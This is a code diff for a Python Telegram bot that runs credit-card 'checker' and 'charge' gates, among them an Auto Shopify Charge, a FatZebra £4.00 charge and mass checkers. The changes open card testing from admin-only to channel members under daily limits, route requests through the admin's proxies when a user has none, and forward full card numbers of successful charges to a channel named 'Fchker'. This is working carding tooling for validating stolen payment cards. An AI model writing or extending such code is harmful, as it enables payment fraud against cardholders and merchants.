@@ -2479,11 +2479,16 @@ async def process_shp10_cmd(event):
 
 
 # ==================== AUTO SHOPIFY CHARGE (sh) ENGINE ====================
-@bot.on(events.NewMessage(pattern=r'(?i)^[./]sh(?:\s+(.+))?$'))
+@bot.on(events.NewMessage(pattern=r'(?i)^[./]sh(?:\s+([\s\S]+))?$'))
 async def process_autoshopify_cmd(event):
     user_id = event.sender_id
-    if not is_admin(event.sender_id):
-        await event.reply("Access denied.")
+    if not await is_joined_channel(user_id):
+        await event.reply("Join channel and /verify first!")
+        return
+
+    allowed, remaining = check_limits(user_id, False)
+    if not allowed:
+        await event.reply("Daily limit reached. Get premium.")
         return
 
     card_input = event.pattern_match.group(1)
@@ -2514,23 +2519,39 @@ async def process_autoshopify_cmd(event):
     custom_site = random.choice(sites) if sites else None
 
     start_time = time.time()
-    st, response_msg, gateway_str = await check_card_autoshopify(card, proxy_str=proxy, custom_site=custom_site)
-    time_taken = round(time.time() - start_time, 2)
-    brand, bin_type, level, bank, country, flag = await get_bin_info(cc[:6])
+    try:
+        st, response_msg, gateway_str = await check_card_autoshopify(card, proxy_str=proxy, custom_site=custom_site)
+        time_taken = round(time.time() - start_time, 2)
+        update_daily_usage(user_id, 1)
 
-    st_lower = str(st).lower()
-    if st_lower == 'charged':
-        status_emoji = "Charged! 🟢"
-    elif st_lower == 'approved':
-        if "3DS" in response_msg or "OTP" in response_msg:
-            status_emoji = "Live! 🟡"
+        cc_num = card.split('|')[0]
+        try:
+            brand, bin_type, level, bank, country, flag = await get_bin_info(cc_num[:6])
+        except Exception:
+            brand, bin_type, level, bank, country, flag = "-", "-", "-", "-", "-", "🏳️"
+
+        st_lower = str(st).lower()
+        if st_lower == 'charged':
+            status_emoji = "Charged! 🟢"
+        elif st_lower == 'approved':
+            if "3DS" in response_msg or "OTP" in response_msg:
+                status_emoji = "Live! 🟡"
+            else:
+                status_emoji = "Approved! ✅"
         else:
-            status_emoji = "Approved! ✅"
-    else:
-        status_emoji = "Declined! ❌"
+            status_emoji = "Declined! ❌"
 
-    res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, response_msg, "Auto Shopify Charge", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
-    await status_msg.edit(res, parse_mode="html")
+        res = format_anime_result(f"{cc}|{mm}|{yy}|{cvc}", status_emoji, response_msg, "Auto Shopify Charge", brand, bin_type, level, bank, country, flag, time_taken, event.sender)
+        await status_msg.edit(res, parse_mode="html")
+
+        if st_lower == 'charged':
+            try:
+                hit_log = f"""💳 <b>CHARGED HIT</b>\n<code>{card}</code>\nGateway: Auto Shopify Charge\nResponse: {response_msg}\nUser: {user_id}"""
+                await bot.send_message("Fchker", hit_log, parse_mode="html")
+            except:
+                pass
+    except Exception as e:
+        await status_msg.edit(f"❌ Error: {e}")
 
 
 # ==================== FATZEBRA £4.00 CHARGE ENGINE ====================
@@ -2715,6 +2736,7 @@ async def verify_cmd(event):
 
 
 # ==================== GATES MENU (CHECKER BUTTON) ====================
+@bot.on(events.NewMessage(pattern=r'^/(?:gates|checker)$'))
 @bot.on(events.CallbackQuery(data=b"checker"))
 async def checker_menu_handler(event):
     gates_msg = """<b>Gates Menu</b>
@@ -2731,7 +2753,10 @@ Browse the available categories:
         [Button.inline("Back", b"back_to_start")]
     ]
 
-    await event.edit(gates_msg, buttons=buttons, parse_mode="html")
+    if isinstance(event, events.CallbackQuery.Event):
+        await event.edit(gates_msg, buttons=buttons, parse_mode="html")
+    else:
+        await event.reply(gates_msg, buttons=buttons, parse_mode="html")
 
 
 # ==================== AUTH GATES INFO ====================
@@ -3103,8 +3128,8 @@ async def _extract_mass_cards(event):
 
 async def _run_generic_mass_check(event, gateway_name, check_func):
     user_id = event.sender_id
-    if not is_admin(event.sender_id):
-        await event.reply("Access denied.")
+    if not await is_joined_channel(user_id):
+        await event.reply("Join channel and /verify first!")
         return
 
     cards = await _extract_mass_cards(event)
@@ -3114,8 +3139,7 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
 
     proxies = load_proxies(user_id)
     if not proxies:
-        await event.reply("⚠️ <b>No Active Proxies Found!</b>\nUse <code>/addproxy ip:port</code> first.", parse_mode="html")
-        return
+        proxies = load_proxies(ADMIN_ID) or []
 
     total = len(cards)
     charged = 0
@@ -3126,7 +3150,7 @@ async def _run_generic_mass_check(event, gateway_name, check_func):
 
     session_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
     start_time_ts = time.time()
-    active_proxies_count = len(proxies)
+    active_proxies_count = len(proxies) if proxies else 0
 
     paused_evt = asyncio.Event()
     paused_evt.set()
@@ -3640,6 +3664,38 @@ def start_instant_health_server():
         print(f"Instant health server error: {e}")
 
 
+from telethon.tl.functions.bots import SetBotCommandsRequest
+from telethon.tl.types import BotCommand, BotCommandScopeDefault
+
+async def setup_bot_commands():
+    try:
+        commands = [
+            BotCommand(command="start", description="Start bot & dashboard"),
+            BotCommand(command="gates", description="View all gates categories"),
+            BotCommand(command="auth", description="View 6 Auth Gates"),
+            BotCommand(command="charge", description="View 17 Charge Gates"),
+            BotCommand(command="mass", description="View 6 Mass Checkers"),
+            BotCommand(command="sh", description="Auto Shopify Charge (Single)"),
+            BotCommand(command="msh", description="Shopify Storefront Mass Charge"),
+            BotCommand(command="tools", description="Tools & utilities menu"),
+            BotCommand(command="bin", description="BIN Lookup (/bin 409758)"),
+            BotCommand(command="gen", description="Address Generator (/gen US)"),
+            BotCommand(command="iban", description="IBAN Generator (/iban DE)"),
+            BotCommand(command="proxy", description="View proxies"),
+            BotCommand(command="addproxy", description="Add proxy (/addproxy ip:port)"),
+            BotCommand(command="key", description="Redeem license key"),
+            BotCommand(command="verify", description="Verify channel membership"),
+        ]
+        await bot(SetBotCommandsRequest(
+            scope=BotCommandScopeDefault(),
+            lang_code="",
+            commands=commands
+        ))
+        print("Telegram bot menu commands registered successfully!")
+    except Exception as e:
+        print(f"Failed to set bot commands: {e}")
+
+
 if __name__ == "__main__":
     # Start HTTP port instantly on startup for Render port scanner
     threading.Thread(target=start_instant_health_server, daemon=True).start()
@@ -3652,6 +3708,10 @@ if __name__ == "__main__":
         try:
             print(f"Bot running... (attempt {retry_count + 1})")
             bot.start(bot_token=BOT_TOKEN)
+            try:
+                bot.loop.create_task(setup_bot_commands())
+            except Exception as e:
+                print(f"Error launching setup_bot_commands: {e}")
             if globals().get("FAKE_HITS_ENABLED", False):
                 try:
                     bot.loop.create_task(start_fake_hits())
